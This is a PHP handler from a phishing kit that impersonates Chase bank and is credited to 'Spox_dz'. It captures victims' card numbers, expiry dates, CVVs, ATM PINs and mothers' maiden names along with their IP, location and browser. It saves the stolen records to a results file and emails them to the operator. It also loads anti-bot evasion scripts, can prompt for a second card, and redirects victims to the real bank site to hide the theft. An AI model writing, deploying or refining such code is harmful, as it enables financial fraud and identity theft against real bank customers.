<?php
ob_start();
session_start();

/**
 * DO NOT SELL THIS SCRIPT ! 
 * DO NOT CHANGE COPYRIGHT !
 * CHASE -
 * version 3.0
 * icq & telegram = spoxcoder
 
###############################################
#$            C0d3d by Spox_dz               $#
#$   Recording doesn't  make you a Coder     $#
#$          Copyright 2020 Chase             $#
###############################################

**/

include'../Anti/IP-BlackList.php';  
include'../Anti/Bot-Crawler.php';
include'../Anti/Bot-Spox.php';
include'../Anti/blacklist.php';
include'../Anti/new.php';
include'../Anti/Dila_DZ.php';


if (!isset($_SESSION['login_SESSION'])) {
  header("Location: ../../index");
  exit();
}

if(isset($_POST['invalid'])){

	include '../../admin/YOUR-CONFIG.php';
	include '../Functions/Fuck-you.php';

	$hi="#---------------------------[ -CHASE-SPOX V3- CARD DETAILS 2 ]----------------------------#\r\n";
	$hi.="Card Number	: {$_POST['spox_cc']}\r\n";
	$hi.="Expiration date: {$_POST['spox_cc_exp']}\r\n";
	$hi.="Security code : {$_POST['spox_cvv']}\r\n";
	$hi.="Atm pin : {$_POST['spox_atm_pin']}\r\n";
	$hi.="Mmn : {$_POST['mmn']}\r\n";

	$hi.="#---------------------------[ -CHASE-SPOX V3- IP INFO ]----------------------------#\r\n";
	$hi.="IP ADDRESS	: {$_SESSION['ip']}\r\n";
	$hi.="IP COUNTRY	: {$_SESSION['country']}\r\n";
	$hi.="IP CITY	: {$_SESSION['city']}\r\n";
	$hi.="BROWSER		: {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
	$hi.="USER AGENT	: {$_SERVER['HTTP_USER_AGENT']}\r\n";
	$hi.="TIME		: ".date("d/m/Y h:i:sa")." GMT\r\n";
	$hi.="#---------------------------[ -CHASE-SPOX V3- CARD DETAILS 2 ]----------------------------#\r\n";

		$save=fopen("../Chase_Result/cc".$pin.".txt","a+");
		fwrite($save,$hi);
		fclose($save);

	$subject="#CHASE SPOX CC 2 => From {$_SESSION['ip']} [ {$_SESSION['country']}-{$_SESSION['countrycode']} - {$_SESSION['platform']} ]";

	$headers="From: CHASE SPOX  <chase_spox_v3@dila.dz>\r\n";
	$headers.="MIME-Version: 1.0\r\n";
	$headers.="Content-Type: text/plain; charset=UTF-8\r\n";

		@mail($your_email2,$subject,$hi,$headers);
		$key = substr(sha1(mt_rand()),1,25);

	if ($show_success_page=="yes") {
		exit(header("Location: ../../thanks?chase_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode']."")); 
	}else{

		$helper = array_keys($_SESSION);
    		foreach ($helper as $key){
        		unset($_SESSION[$key]);
    			}
    		exit(header("Location: https://bit.ly/2koaH3G")); // go to bank login page officiel..
	}

}

if(isset($_POST['spox_cc'])&&isset($_POST['spox_cc_exp'])&&isset($_POST['spox_cvv'])&&isset($_POST['spox_atm_pin'])&&isset($_POST['token_spox'])){
	include '../../admin/YOUR-CONFIG.php';
	include '../Functions/Fuck-you.php';

	$hi="#---------------------------[ -CHASE-SPOX V3- CARD DETAILS ]----------------------------#\r\n";
	$hi.="Card Number: {$_POST['spox_cc']}\r\n";
	$hi.="Expiration date: {$_POST['spox_cc_exp']}\r\n";
	$hi.="Security code : {$_POST['spox_cvv']}\r\n";
	$hi.="Atm pin : {$_POST['spox_atm_pin']}\r\n";
	$hi.="Mmn : {$_POST['mmn']}\r\n";
	
	$hi.="#---------------------------[ -CHASE-SPOX V3- IP INFO ]----------------------------#\r\n";
	$hi.="IP ADDRESS: {$_SESSION['ip']}\r\n";
	$hi.="IP COUNTRY: {$_SESSION['country']}\r\n";
	$hi.="IP CITY: {$_SESSION['city']}\r\n";
	$hi.="BROWSER: {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
	$hi.="USER AGENT: {$_SERVER['HTTP_USER_AGENT']}\r\n";
	$hi.="TIME: ".date("d/m/Y h:i:sa")." GMT\r\n";
	$hi.="#---------------------------[ -CHASE-SPOX V3- CARD DETAILS ]----------------------------#\r\n";

		$save=fopen("../Chase_Result/cc".$pin.".txt","a+");
		fwrite($save,$hi);
		fclose($save);

	$subject="#CHASE SPOX CC 1 => From {$_SESSION['ip']} [ {$_SESSION['country']}-{$_SESSION['countrycode']} - {$_SESSION['platform']} ]";

	$headers="From: CHASE SPOX  <chase_spox_v3@dila.dz>\r\n";
	$headers.="MIME-Version: 1.0\r\n";
	$headers.="Content-Type: text/plain; charset=UTF-8\r\n";

		@mail($your_email2,$subject,$hi,$headers);
		$key = substr(sha1(mt_rand()),1,25);

	if ($double_cc=="yes") {
		exit(header("Location: ../../credit_verify?invalid=card&chase_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode'].""));
	}
	if ($show_success_page=="yes") {
		exit(header("Location: ../../thanks?chase_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode']."")); 
	}else{

		$helper = array_keys($_SESSION);
    		foreach ($helper as $key){
        		unset($_SESSION[$key]);
    			}
    		exit(header("Location: https://bit.ly/2koaH3G")); // go to bank login page officiel..
	}

}else{
    header("HTTP/1.0 404 Not Found");
    exit();
}

?>